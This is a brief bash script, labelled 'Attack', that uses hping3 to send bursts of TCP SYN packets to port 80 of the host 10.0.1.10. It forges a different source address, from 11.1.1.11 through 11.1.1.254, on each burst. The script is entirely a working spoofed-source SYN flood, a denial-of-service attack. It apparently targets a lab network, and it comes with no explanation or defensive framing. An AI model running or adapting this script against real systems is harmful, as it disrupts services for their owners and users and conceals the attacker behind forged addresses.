#!/bin/bash

echo "Attack"
set -x

VAL="11.1.1."
INDEX=11
while [ $INDEX -le 254 ]
do
        hping3 10.0.1.10 -S -p 80 -c 5 -a $VAL$INDEX
        INDEX=$((INDEX+1))
done
